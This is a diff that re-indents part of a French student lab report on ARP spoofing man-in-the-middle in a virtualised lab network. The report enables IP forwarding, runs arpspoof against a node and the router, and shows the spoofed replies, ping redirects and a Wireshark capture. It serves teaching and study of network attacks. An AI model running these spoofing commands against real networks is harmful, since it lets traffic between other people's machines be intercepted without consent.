@@ -303,66 +303,66 @@
   00:0c:29:c1:9a:96  10.2.1.254 expires in 114 seconds
   ```
 
-  ### MITM ARP
+### MITM ARP
 
-  - **Machine attaquantes :**
-    - IP : `10.2.1.12'
-    - Adresse mac : `00:0c:29:c1:9a:96`
+- **Machine attaquantes :**
+  - IP : `10.2.1.12'
+  - Adresse mac : `00:0c:29:c1:9a:96`
 
-  - **ARP Spoofing en continue**
+- **ARP Spoofing en continue**
     
-    - Activation de l'ip forwarding
+  - Activation de l'ip forwarding
 
-      ```bash
-      echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
-      sudo sysctl -p #Activation de la mise a jour
-      ```
-    Il est éssentiels d'activer l'ip forwarding pour relayer le trafic.
-    `echo 1` permet d'activer l'ip forwarding dans le fichier
+    ```bash
+    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+    sudo sysctl -p #Activation de la mise a jour
+    ```
+  Il est éssentiels d'activer l'ip forwarding pour relayer le trafic.
+  `echo 1` permet d'activer l'ip forwarding dans le fichier
    
-    - Commande arpspoofing :
+  - Commande arpspoofing :
    
-      ```bash
-      #ARP Spoofing de la machine Node1
+    ```bash
+    #ARP Spoofing de la machine Node1
     
-      sudo arpspoof -i ens33 -t 10.2.1.13 10.2.1.254
+    sudo arpspoof -i ens33 -t 10.2.1.13 10.2.1.254
 
-      #ARP Spoofing du routeur
+    #ARP Spoofing du routeur
 
-      arpspoof -i ens33 -t 10.2.1.254 10.2.1.13
-      ```
+    arpspoof -i ens33 -t 10.2.1.254 10.2.1.13
+    ```
 
-    - Retour :
+  - Retour :
 
-      ```bash
-      #Retour ARP Spoofing de la machine Node1
+    ```bash
+    #Retour ARP Spoofing de la machine Node1
     
-      0:c:29:c1:9a:96 0:50:79:66:68:1 0806 42: arp reply 10.2.1.254 is-at 0:c:29:c1:9a:96
+    0:c:29:c1:9a:96 0:50:79:66:68:1 0806 42: arp reply 10.2.1.254 is-at 0:c:29:c1:9a:96
 
-      #Retour ARP Spoofing du routeur
+    #Retour ARP Spoofing du routeur
 
-      0:c:29:c1:9a:96 0:c:29:c8:f0:fb 0806 42: arp reply 10.2.1.13 is-at 0:c:29:c1:9a:96
-      ```
+    0:c:29:c1:9a:96 0:c:29:c8:f0:fb 0806 42: arp reply 10.2.1.13 is-at 0:c:29:c1:9a:96
+    ```
 
-    - Ping de Node1 vers routeur :
+  - Ping de Node1 vers routeur :
    
-      ```bash
-      ping 10.2.1.254
+    ```bash
+    ping 10.2.1.254
 
-      84 bytes from 10.2.1.254 icmp_seq=1 ttl=64 time=8.815 ms
-      84 bytes from 10.2.1.254 icmp_seq=2 ttl=64 time=3.320 ms
-      84 bytes from 10.2.1.254 icmp_seq=3 ttl=64 time=10.371 ms
-      ```
+    84 bytes from 10.2.1.254 icmp_seq=1 ttl=64 time=8.815 ms
+    84 bytes from 10.2.1.254 icmp_seq=2 ttl=64 time=3.320 ms
+    84 bytes from 10.2.1.254 icmp_seq=3 ttl=64 time=10.371 ms
+    ```
 
-    - Ping de Node1 vers routeur :
+  - Ping de Node1 vers routeur :
    
-      ```bash
-      ping 10.2.1.13
+    ```bash
+    ping 10.2.1.13
 
-      PING 10.2.1.13 (10.2.1.13) 56(84) bytes of data.
-      FROM 10.2.1.12 icmp_seq=1 Redirect Host(New nexthop: 10.2.1.13)
-      64 bytes from 10.2.1.13: icmp_seq1 ttl=63 time=8.63 ms
-      ```
+    PING 10.2.1.13 (10.2.1.13) 56(84) bytes of data.
+    FROM 10.2.1.12 icmp_seq=1 Redirect Host(New nexthop: 10.2.1.13)
+    64 bytes from 10.2.1.13: icmp_seq1 ttl=63 time=8.63 ms
+    ```
 
   - **Wireshark**
     - Ping du Node1 vers le routeur : [ICI](https://github.com/Phoenix0108/EFREI-Virtualisation/blob/main/TP2/Wireshark/MITM_Node1.pcapng)
